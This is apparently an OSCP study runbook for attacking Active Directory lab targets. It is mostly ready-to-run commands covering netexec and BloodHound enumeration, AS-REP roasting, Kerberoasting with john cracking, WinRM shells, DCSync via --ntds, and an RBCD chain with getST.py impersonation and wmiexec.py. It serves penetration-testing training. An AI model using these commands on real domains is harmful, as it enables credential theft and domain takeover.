# Active Directory Fast Path

Use this page when SMB, LDAP, Kerberos, domain credentials, or the target description identifies an AD environment. Validate credentials first, collect the graph, and let the highest-value BloodHound edge choose the next operation.

## Fast loop

### Run this

~~~bash
netexec smb "$DCIP" -u "$Username" -p "$Password" -d "$Domain" --shares
netexec ldap "$DCIP" -u "$Username" -p "$Password" -d "$Domain" --users
mkdir -p "$BoxDir/loot/bloodhound"
bloodhound-python -d "$Domain" -u "$Username" -p "$Password" -ns "$DCIP" -c All \
  --zip -op "$BoxDir/loot/bloodhound/bh-data"
sudo neo4j start
bloodhound --no-sandbox &
~~~

### Example output

~~~text
[*] Found $Domain domain
[*] Found $ComputerCount computers
[*] Compressing output into $Archive
~~~

### What did you get?

- [ ] Direct replication rights or `--ntds` succeeds -> **Open [[OSCP/RUNBOOK V2/AD - DCSync Dump|AD DCSync Dump]].**
- [ ] `ReadGMSAPassword`, group control, SPN, or RBCD edge -> **Use the matching edge row below.**
- [ ] Kerberoastable SPN -> **Request the TGS, crack offline, and validate the recovered account.**
- [ ] NTLM is disabled or tickets fail on time -> **Open [[OSCP/RUNBOOK V2/AD - Clock Sync|AD Clock Sync]], then recollect with Kerberos.**
- [ ] No useful path -> **Open [[OSCP/RUNBOOK V2/AD - Local Credential Search|AD Local Credential Search]] and return to credential validation.**
- [ ] Privileged WinRM or SMB access is confirmed -> **Open [[OSCP/EXAM RUNBOOK/08 - Evidence and Clean Down|Evidence and Clean Down]].**

### Open next

Import the ZIP, search the current principal, select one exact edge, and validate it before making any directory change. Use the RBCD chain below only when the graph and LDAP evidence support it.

## 1. Validate and identify

Set `$DCIP`, `$Domain`, and `$FQDN` from the service banners and DNS results. If this target is the domain controller, `boxset DCIP "$BoxIP"` is sufficient; otherwise use the discovered controller address.

~~~bash
netexec smb "$DCIP" -u "$Username" -p "$Password" -d "$Domain"
netexec smb "$DCIP" -u "$Username" -p "$Password" -d "$Domain" --shares
netexec ldap "$DCIP" -u "$Username" -p "$Password" -d "$Domain" --users
ldapsearch -x -H "ldap://$DCIP" -D "$Username@$Domain" -w "$Password" \
  -b "DC=$(printf '%s' "$Domain" | sed 's/\./,DC=/g')" \
  '(objectClass=domain)' dnsHostName defaultNamingContext
~~~

If NTLM is disabled, use Kerberos with the FQDN and a valid ccache. Open [[OSCP/RUNBOOK V2/AD - Clock Sync|AD Clock Sync]] before ticket work when time differs.

## 2. BloodHound collection and GUI

~~~bash
mkdir -p "$BoxDir/loot/bloodhound"
bloodhound-python -d "$Domain" -u "$Username" -p "$Password" -ns "$DCIP" -c All \
  --zip -op "$BoxDir/loot/bloodhound/bh-data"
sudo neo4j start
bloodhound --no-sandbox &
~~~

Import the ZIP in the BloodHound GUI. Search the current user, then inspect shortest paths to Domain Admins, the domain controller, high-value groups, and controlled computers. Record the exact edge and target object before changing anything.

## 3. Fast Kerberos checks

~~~bash
GetNPUsers.py "$Domain/" -dc-ip "$DCIP" -usersfile "$BoxDir/loot/users.txt" \
  -no-pass -format hashcat -outputfile "$BoxDir/loot/asrep.txt"
GetUserSPNs.py "$Domain/$Username:$Password" -dc-ip "$DCIP" \
  -request -outputfile "$BoxDir/loot/kerberoast.txt"
~~~

Crack only hashes that the evidence identifies as in scope:

~~~bash
john --wordlist=/usr/share/wordlists/rockyou.txt "$BoxDir/loot/kerberoast.txt"
~~~

## 4. Remote shell validation

~~~bash
netexec winrm "$FQDN" -u "$Username" -p "$Password" -d "$Domain"
evil-winrm -i "$FQDN" -u "$Username" -p "$Password"
~~~

## 5. BloodHound edge branches

| Highest-value edge | Fast next action |
|---|---|
| Direct administrator or Domain Admin access | Validate with `netexec smb` or `netexec winrm`, then open [[OSCP/EXAM RUNBOOK/08 - Evidence and Clean Down\|Evidence and Clean Down]] |
| ReadGMSAPassword | Read the gMSA password with the exact LDAP or gMSADumper route; validate once; open [[OSCP/RUNBOOK V2/AD - Credential Validation\|AD - Credential Validation]] |
| Kerberoastable SPN | Request the TGS with `GetUserSPNs.py`, crack offline with John, then validate the recovered account |
| ForceChangePassword or GenericWrite | Re-read the ACL, change only the named object, validate the resulting credential, and open [[OSCP/RUNBOOK V2/AD - Group Triage\|AD - Group Triage]] |
| AddMember or Account Operators path | Add only the controlled account to the identified group, verify membership, then refresh tickets |
| RBCD or AllowedToAct path | Use [[OSCP/RUNBOOK V2/AD - Resource-Based Constrained Delegation\|AD - Resource-Based Constrained Delegation]] with bloodyAD and getST.py; request only the service ticket needed |
| Replication rights or DCSync | Test `netexec smb "$DCIP" -u "$Username" -p "$Password" -d "$Domain" --ntds`, then open [[OSCP/RUNBOOK V2/AD - DCSync Dump\|AD - DCSync Dump]] |
| No useful BloodHound path | Open [[OSCP/RUNBOOK V2/AD - Local Credential Search\|AD - Local Credential Search]] and [[OSCP/RUNBOOK V2/AD - Privilege Triage\|AD - Privilege Triage]] |

## 6. Kerberos and RBCD fast chain

~~~bash
KRB5CCNAME="$BoxDir/loot/$Username.ccache" \
  bloodyAD -d "$Domain" -u "$Username" -k \
  ccache="$BoxDir/loot/$Username.ccache" kdc="$DCIP" \
  -H "$FQDN" -i "$DCIP" add groupMember "$DelegatedGroup" "$MachineAccount"
KRB5CCNAME="$BoxDir/loot/$MachineAccount.ccache" \
  getST.py -spn "cifs/$FQDN" -impersonate "$AdminUser" -dc-ip "$DCIP" \
  "$Domain/$MachineAccount" -k -no-pass -out "$BoxDir/loot/$AdminUser.ccache"
KRB5CCNAME="$BoxDir/loot/$AdminUser.ccache" \
  wmiexec.py -k -no-pass "$FQDN"
~~~

Use the exact group, machine account, SPN, and ccache established by BloodHound and LDAP. If a ticket returns `KDC_ERR_BADOPTION`, refresh group membership and the machine TGT before changing the exploit path.

## Write-up examples

- [[OSCP/BOXES/WRITE UPS/AD/Vintage|Vintage]] -- Kerberos-only assumed breach, gMSA read, group abuse, Kerberoasting, DPAPI, and RBCD
- [[OSCP/BOXES/WRITE UPS/AD/Search|Search]] -- IIS image credential, Kerberoasting, SMB profile/XLSX, PFX/PSWA, gMSA, and delegated password reset
- [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] -- anonymous LDAP, ACL abuse, RBCD, and S4U2Proxy
- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- anonymous enumeration, AS-REP roasting, and domain escalation

## Search pattern

If web content supplies the first credential, validate it over LDAP and SMB, then use the AD service path. Repair local name resolution before Kerberos requests, spray one recovered password across known users, and treat readable redirected profiles as credential-bearing shares. A gMSA result must include its PrincipalsAllowedToReadPassword and the exact delegated right before any target password is changed.

See [[OSCP/RUNBOOK V2/AD - PowerShell Web Access|AD - PowerShell Web Access]] and [[OSCP/BOXES/WRITE UPS/AD/Search|Search]].

## Detailed routes

- [[OSCP/RUNBOOK V2/AD - BloodHound|RUNBOOK V2 AD BloodHound]]
- [[OSCP/RUNBOOK V2/AD - Kerberoasting|RUNBOOK V2 Kerberoasting]]
- [[OSCP/RUNBOOK V2/AD - Resource-Based Constrained Delegation|RUNBOOK V2 RBCD]]
- [[OSCP/MODERN TOOLING/BloodHound-Python|BloodHound-Python]]
- [[OSCP/MODERN TOOLING/BloodyAD|BloodyAD]]
- [[OSCP/MODERN TOOLING/NetExec|NetExec]]
- [[OSCP/DECISION TREE/Active Directory (Decision Tree)|Active Directory Decision Tree]]
